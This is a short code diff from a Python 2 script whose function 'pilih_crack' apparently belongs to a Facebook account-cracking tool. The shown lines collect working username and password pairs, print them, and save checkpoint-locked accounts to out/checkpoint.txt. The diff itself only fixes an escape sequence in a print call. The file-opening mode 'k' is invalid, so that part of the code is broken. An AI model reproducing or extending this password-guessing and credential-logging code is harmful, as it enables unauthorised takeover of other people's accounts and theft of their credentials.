@@ -950,7 +950,7 @@ def pilih_crack():
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in s["error_msg"]:
-							print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \\x1b[1;97m\x1b[1;97m ' + pass2
+							print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
 							cek = open("out/checkpoint.txt", "k")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
@@ -992,7 +992,7 @@ def pilih_crack():
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in s["error_msg"]:
-													print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \\x1b[1;97m\x1b[1;97m ' + pass5
+													print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
 													cek = open("out/checkpoint.txt", "k")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
